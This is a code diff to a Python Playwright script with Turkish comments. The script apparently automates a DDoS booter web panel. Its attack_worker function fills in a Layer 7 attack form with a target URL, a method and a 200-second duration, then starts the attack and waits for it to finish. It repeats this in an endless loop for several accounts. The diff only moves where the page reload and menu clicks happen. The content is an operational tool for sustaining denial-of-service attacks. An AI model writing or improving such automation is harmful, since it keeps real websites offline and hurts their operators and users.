@@ -124,20 +124,11 @@ def attack_worker(account):
                 # ---------- ANA SALDIRI DÖNGÜSÜ (SONSUZ) ----------
                 while True:
                     try:
-                        # Sayfayı yenile ve elementlerin yüklenmesini bekle
-                        page.reload(wait_until="domcontentloaded")
-                        page.wait_for_timeout(2000)
-                        
-                        # #layer_7'ye tıkla
-                        page.wait_for_selector("#layer_7", timeout=15000)
-                        page.locator("#layer_7").click()
-                        page.wait_for_timeout(1000)
-                        
                         # Formu doldur
                         page.wait_for_selector("#l7host", timeout=15000)
                         page.fill("#l7host", target_url)
                         page.select_option("#l7method", value=method)
-                        page.fill("#l7time", "200")  # Sabit 200 saniye
+                        page.fill("#l7time", "200")
                         
                         # Başlat butonuna tıkla
                         page.wait_for_selector("#l7btn", timeout=15000)
@@ -147,7 +138,6 @@ def attack_worker(account):
 
                         # Saldırı durumu takibi
                         while True:
-                            # Sayfadaki saldırı durumunu kontrol et
                             no_attacks = page.locator(".dataTables_empty:has-text('No running attacks')")
                             if no_attacks.count() > 0 and no_attacks.is_visible():
                                 print(f"[{username}] ⏰ Saldırı bitti.")
@@ -168,13 +158,24 @@ def attack_worker(account):
                             
                             time.sleep(2)
 
+                        # Saldırı bitti, sayfayı yenile ve tekrar hazırlan
+                        print(f"[{username}] 🔄 Sayfa yenileniyor...")
+                        page.reload(wait_until="domcontentloaded")
+                        page.wait_for_timeout(3000)
+                        # Tekrar #layer_7'ye tıkla
+                        page.wait_for_selector("#layer_7", timeout=15000)
+                        page.locator("#layer_7").click()
+                        page.wait_for_timeout(1000)
+
                     except Exception as inner_err:
                         print(f"[{username}] ⚠️ Adım hatası: {inner_err}")
                         consecutive_errors += 1
                         try:
-                            # Sayfayı yenile ve tekrar dene
                             page.reload(wait_until="domcontentloaded")
-                            page.wait_for_timeout(3000)
+                            page.wait_for_timeout(5000)
+                            page.wait_for_selector("#layer_7", timeout=15000)
+                            page.locator("#layer_7").click()
+                            page.wait_for_timeout(1000)
                         except:
                             pass
                         continue
